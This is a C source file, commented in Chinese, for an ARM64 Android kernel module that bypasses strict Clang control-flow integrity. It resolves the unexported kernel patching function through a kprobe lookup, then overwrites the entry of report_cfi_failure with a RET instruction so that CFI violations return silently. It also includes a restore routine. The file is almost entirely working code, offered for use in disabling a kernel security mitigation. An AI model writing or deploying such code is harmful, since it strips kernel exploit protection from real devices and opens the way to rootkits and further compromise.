/* mykc_cfi.c —— CFI 严格模式绕过 (A 路线, 学 paradise 手法)
 *
 * =====================================================================
 *  设备实证 (2026-10-16, /proc/kallsyms + /proc/config.gz 实查):
 *    CONFIG_CFI_CLANG=y
 *    # CONFIG_CFI_PERMISSIVE is not set       <-- 严格模式: 校验失败 => BUG => panic
 *    # CONFIG_LTO_CLANG_THIN is not set       <-- ★ 设备内核自己就没开 LTO!
 *    CONFIG_SHADOW_CALL_STACK=y
 *
 *    T report_cfi_failure                    <-- ★ 目标存在
 *    T aarch64_insn_patch_text_nosync        <-- ★ patch 工具存在且已导出
 *    T aarch64_insn_patch_text               <-- 同上
 *
 *  ==> 结论: typeid 与 LTO 无关 (设备内核没 LTO 照样跑 paradise 模块)。
 *      我们用 GKI 树编外部模块, __kcfi_typeid_* 与设备内核"种子"不齐 =>
 *      一执行间接调用就 CFI 失败。A 路线不追求生成 typeid, 而是
 *      **直接把 report_cfi_failure 的第一条指令改成 RET**, 失败即静默返回。
 *
 *  patch 流程 (paradise 手法):
 *      1. kprobe 惰性解析 report_cfi_failure 地址 (只用导出符号 register_kprobe)
 *      2. 读原第一条指令备份
 *      3. aarch64_insn_patch_text_nosync(addr, ARM64_RET)
 *      4. 校验写回成功
 *
 *  ★ 与 v1 草稿的修正:
 *      - ARM64_NOP 宏去掉非法后缀 'u'
 *      - 只 patch 真实存在的 report_cfi_failure (删掉不存在的 __cfi_slowpath 等)
 *      - 改用 patch_text_nosync(单指令版), 签名简单无歧义
 *      - 移除 extern mykc_klookup (mykc_main.c 里只有 static, 会 UND)
 * =====================================================================
 */
#define pr_fmt(fmt) "[mykc] " fmt

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/kprobes.h>

/* ★★★ 关键 (v13 修正, 2026-10-17 真机实证) ★★★
 *   aarch64_insn_patch_text_nosync 虽然出现在 /proc/kallsyms (T, 全局文本符号),
 *   但它 **没有 EXPORT_SYMBOL** —— 实证:
 *     __ksymtab_aarch64_insn_patch_text*  => 不存在
 *     __ksymtab_register_kprobe           => 存在 (对照)
 *   直接 extern 调用 => insmod 报 ENOENT ("No such file or directory")。
 *
 *   解法: 用 register_kprobe 惰性解析出它的真实地址, 再用函数指针调用。
 *         这也是我们模块已有的「kprobe 白嫖未导出符号」手法 (学 paradise)。
 * ===================================================================== */
typedef int (*patch_text_nosync_t)(void *addr, u32 insn);
static patch_text_nosync_t g_patch_text_nosync;

/* ARM64 指令编码 */
#define ARM64_RET_INSN   0xd65f03c0u   /* ret */

/* =====================================================================
 *  符号解析: 独立实现, 不依赖 mykc_main.c 的 static 函数
 * ===================================================================== */
static unsigned long cfi_kprobe_resolve(const char *name)
{
    struct kprobe kp;
    unsigned long addr = 0;
    int ret;

    memset(&kp, 0, sizeof(kp));
    kp.symbol_name = name;
    ret = register_kprobe(&kp);
    if (ret < 0)
        return 0;

    addr = (unsigned long)kp.addr;
    unregister_kprobe(&kp);
    return addr;
}

/* ★ 惰性解析 patch_text 函数地址 (未导出, 只能用 kprobe 白嫖) */
static int cfi_init_patch_fn(void)
{
    unsigned long a;

    if (g_patch_text_nosync)
        return 0;

    a = cfi_kprobe_resolve("aarch64_insn_patch_text_nosync");
    if (!a) {
        pr_warn("cfi: cannot resolve aarch64_insn_patch_text_nosync\n");
        return -ENOENT;
    }

    g_patch_text_nosync = (patch_text_nosync_t)a;
    pr_info("cfi: patch fn @ %px\n", (void *)a);
    return 0;
}

/* =====================================================================
 *  目标表: 只保留设备实证存在的符号
 * ===================================================================== */
struct cfi_target {
    const char *name;
    unsigned long addr;
    u32 saved;
    int patched;
};

static struct cfi_target cfi_targets[] = {
    { .name = "report_cfi_failure" },   /* ★ 主目标 (kallsyms 实证 T) */
};

/*
 * patch 单个目标: 把入口第一条指令改成 RET
 *   返回: 0 = 本次成功 patch
 *         1 = 已经是 RET (之前 patch 过, 幂等)
 *        <0 = 失败
 */
static int cfi_patch_one(struct cfi_target *t)
{
    u32 cur;
    int ret;

    t->addr = cfi_kprobe_resolve(t->name);
    if (!t->addr) {
        pr_warn("cfi: symbol %s not found\n", t->name);
        return -ENOENT;
    }

    pr_info("cfi: %s @ %px\n", t->name, (void *)t->addr);

    /* 备份原指令 */
    memcpy(&t->saved, (void *)t->addr, sizeof(t->saved));

    /* 幂等: 已是 RET 就跳过 */
    if (t->saved == ARM64_RET_INSN) {
        pr_info("cfi: %s already patched\n", t->name);
        t->patched = 1;
        return 1;
    }

    ret = g_patch_text_nosync((void *)t->addr, ARM64_RET_INSN);
    if (ret) {
        pr_warn("cfi: patch %s failed: %d\n", t->name, ret);
        return ret;
    }

    /* 校验 */
    memcpy(&cur, (void *)t->addr, sizeof(cur));
    if (cur != ARM64_RET_INSN) {
        pr_warn("cfi: verify %s failed (got %08x, want %08x)\n",
                t->name, cur, ARM64_RET_INSN);
        return -EIO;
    }

    t->patched = 1;
    pr_info("cfi: patched %s -> RET (saved %08x)\n", t->name, t->saved);
    return 0;
}

/*
 * 主入口: 建议在 mykc_init() 最开头 (任何间接调用之前) 调用。
 *   返回 0 = 至少成功 patch 了一个目标
 *   返回 <0 = 全部失败
 */
int mykc_cfi_bypass(void)
{
    int ok = 0;
    unsigned int i;

    pr_info("cfi: === CFI bypass (A-route) start ===\n");
    pr_info("cfi: kernel has CFI_CLANG=y & PERMISSIVE=n => strict mode\n");

    /* ★ 必须最先解析 patch 函数地址 (未导出符号, 只能 kprobe 白嫖) */
    if (cfi_init_patch_fn() != 0) {
        pr_err("cfi: abort, cannot get patch_text fn\n");
        return -ENOENT;
    }

    for (i = 0; i < ARRAY_SIZE(cfi_targets); i++) {
        int r = cfi_patch_one(&cfi_targets[i]);
        if (r == 0 || r == 1)
            ok++;
    }

    pr_info("cfi: === bypass result: %d/%u patched ===\n",
            ok, (unsigned int)ARRAY_SIZE(cfi_targets));
    return ok > 0 ? 0 : -ENOENT;
}

/* 卸载时恢复 (尽力而为; 内核通常不建议恢复已 patch 的 CFI 处理函数) */
void mykc_cfi_restore(void)
{
    unsigned int i;

    for (i = 0; i < ARRAY_SIZE(cfi_targets); i++) {
        struct cfi_target *t = &cfi_targets[i];
        u32 cur;

        if (!t->patched || !t->addr)
            continue;

        memcpy(&cur, (void *)t->addr, sizeof(cur));
        if (cur == ARM64_RET_INSN) {
            g_patch_text_nosync((void *)t->addr, t->saved);
            pr_info("cfi: restored %s -> %08x\n", t->name, t->saved);
        }
    }
}